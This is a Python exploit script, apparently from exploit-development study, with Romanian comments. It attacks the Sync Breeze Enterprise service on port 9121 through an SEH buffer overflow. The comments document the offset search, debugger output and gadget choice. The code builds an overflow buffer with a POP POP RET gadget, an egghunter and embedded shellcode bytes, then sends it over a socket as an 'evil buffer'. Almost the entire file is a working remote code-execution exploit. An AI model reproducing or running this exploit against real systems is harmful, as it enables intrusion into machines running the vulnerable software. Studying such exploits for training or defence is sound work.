#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    # construim un string de 1000 de A
    #inputBuffer = b"\x41" * size
    # asta ne va da:
    '''
    0:008> dt _EXCEPTION_REGISTRATION_RECORD 018eff54
    ntdll!_EXCEPTION_REGISTRATION_RECORD
        +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
        +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
    '''

    #inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
    # asta ne va da:
    '''
    0:008> dt _EXCEPTION_REGISTRATION_RECORD 01b6ff54
    ntdll!_EXCEPTION_REGISTRATION_RECORD
        +0x000 Next             : 0x65413165 _EXCEPTION_REGISTRATION_RECORD          - offset: 124
        +0x004 Handler          : 0x33654132     _EXCEPTION_DISPOSITION  +33654132   - offset: 128
    '''
    # ne reamintim ca Handler este apelat primul
    # in stiva se afla:
    #   - adresa de return
    #   - ExceptionRecord
    #   - adresa Next
    # va trebui sa gasim POP POP RET gadget (vom folosi rp++ fiindca e fain)

    '''
    Module program:
    00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
    008a0000 00974000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
    00980000 00a35000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
    10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
    '''

    shellcode = b''

    # 0x00421955: add al, 0x5F ; pop esi ; pop ebx ; ret  ;  (1 found)
    inputBuffer =  124 * b'A' # offset
    inputBuffer += b'\x90\x90\xEB\x06' # NOP; NOP; JMP 8 bytes in fata

    #inputBuffer += b'\x55\x19\x42\x00' # add al, 0x5F ; pop esi ; pop ebx ; ret - va sari la NEXT - NU IL PUTEM FOLOSI FIINDCA ARE 0x00

    # 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer += b'\xf0\xa2\x15\x10' # pop eax; pop ebx; ret - va sari la NEXT

    inputBuffer += b'\x90' * 2
    #inputBuffer  += b"\x66\x81\xc4\x30\x08" # add sp, 0x830

    # EGGHUNTER
    inputBuffer += b"\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\xb8"
    inputBuffer += b"\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05"
    inputBuffer += b"\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7"
    inputBuffer += b"\xaf\x75\xe6\xaf\x75\xe3\xff\xe7"
    # shellcode
    buf =  b""
    buf += b"\xda\xc8\xbd\xb7\xa7\x29\xab\xd9\x74\x24\xf4\x5a"
    buf += b"\x33\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc\x03\xdd"
    buf += b"\xb4\xcb\x5e\xdd\x53\x89\xa1\x1d\xa4\xee\x28\xf8"
    buf += b"\x95\x2e\x4e\x89\x86\x9e\x04\xdf\x2a\x54\x48\xcb"
    buf += b"\xb9\x18\x45\xfc\x0a\x96\xb3\x33\x8a\x8b\x80\x52"
    buf += b"\x08\xd6\xd4\xb4\x31\x19\x29\xb5\x76\x44\xc0\xe7"
    buf += b"\x2f\x02\x77\x17\x5b\x5e\x44\x9c\x17\x4e\xcc\x41"
    buf += b"\xef\x71\xfd\xd4\x7b\x28\xdd\xd7\xa8\x40\x54\xcf"
    buf += b"\xad\x6d\x2e\x64\x05\x19\xb1\xac\x57\xe2\x1e\x91"
    buf += b"\x57\x11\x5e\xd6\x50\xca\x15\x2e\xa3\x77\x2e\xf5"
    buf += b"\xd9\xa3\xbb\xed\x7a\x27\x1b\xc9\x7b\xe4\xfa\x9a"
    buf += b"\x70\x41\x88\xc4\x94\x54\x5d\x7f\xa0\xdd\x60\xaf"
    buf += b"\x20\xa5\x46\x6b\x68\x7d\xe6\x2a\xd4\xd0\x17\x2c"
    buf += b"\xb7\x8d\xbd\x27\x5a\xd9\xcf\x6a\x33\x2e\xe2\x94"
    buf += b"\xc3\x38\x75\xe7\xf1\xe7\x2d\x6f\xba\x60\xe8\x68"
    buf += b"\xbd\x5a\x4c\xe6\x40\x65\xad\x2f\x87\x31\xfd\x47"
    buf += b"\x2e\x3a\x96\x97\xcf\xef\x39\xc7\x7f\x40\xfa\xb7"
    buf += b"\x3f\x30\x92\xdd\xcf\x6f\x82\xde\x05\x18\x29\x25"
    buf += b"\xce\xe7\x06\x08\xba\x80\x54\x52\xc3\xeb\xd0\xb4"
    buf += b"\xa9\x1b\xb5\x6f\x46\x85\x9c\xfb\xf7\x4a\x0b\x86"
    buf += b"\x38\xc0\xb8\x77\xf6\x21\xb4\x6b\x6f\xc2\x83\xd1"
    buf += b"\x26\xdd\x39\x7d\xa4\x4c\xa6\x7d\xa3\x6c\x71\x2a"
    buf += b"\xe4\x43\x88\xbe\x18\xfd\x22\xdc\xe0\x9b\x0d\x64"
    buf += b"\x3f\x58\x93\x65\xb2\xe4\xb7\x75\x0a\xe4\xf3\x21"
    buf += b"\xc2\xb3\xad\x9f\xa4\x6d\x1c\x49\x7f\xc1\xf6\x1d"
    buf += b"\x06\x29\xc9\x5b\x07\x64\xbf\x83\xb6\xd1\x86\xbc"
    buf += b"\x77\xb6\x0e\xc5\x65\x26\xf0\x1c\x2e\x46\x13\xb4"
    buf += b"\x5b\xef\x8a\x5d\xe6\x72\x2d\x88\x25\x8b\xae\x38"
    buf += b"\xd6\x68\xae\x49\xd3\x35\x68\xa2\xa9\x26\x1d\xc4"
    buf += b"\x1e\x46\x34"

    inputBuffer += b'w00tw00t' + buf + b'A' * (1000-len(buf))

    # testam bad chars in HEAP
    
    '''
    inputBuffer += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a"
    inputBuffer += b"\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14"
    inputBuffer += b"\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
    inputBuffer += b"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28"
    inputBuffer += b"\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32"
    inputBuffer += b"\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
    inputBuffer += b"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46"
    inputBuffer += b"\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    inputBuffer += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    inputBuffer += b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
    inputBuffer += b"\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e"
    inputBuffer += b"\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
    inputBuffer += b"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    inputBuffer += b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
    inputBuffer += b"\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
    inputBuffer += b"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    inputBuffer += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
    inputBuffer += b"\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
    inputBuffer += b"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
    inputBuffer += b"\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
    inputBuffer += b"\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
    inputBuffer += b"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    inputBuffer += b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6"
    inputBuffer += b"\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    inputBuffer += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa"
    inputBuffer += b"\xfb\xfc\xfd\xfe\xff"
    '''

    '''
    inputBuffer += b"\x90" * 2
    inputBuffer += b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer += b"\xff\xe4"             # jmp esp
    inputBuffer += b"\x90" * 1000
    inputBuffer += shellcode
    '''

    # vom construi header-ul
    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])

    completeBuffer = header + inputBuffer

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(completeBuffer)
    s.close()

    print("Done!")
except Exception as e:
    print(e)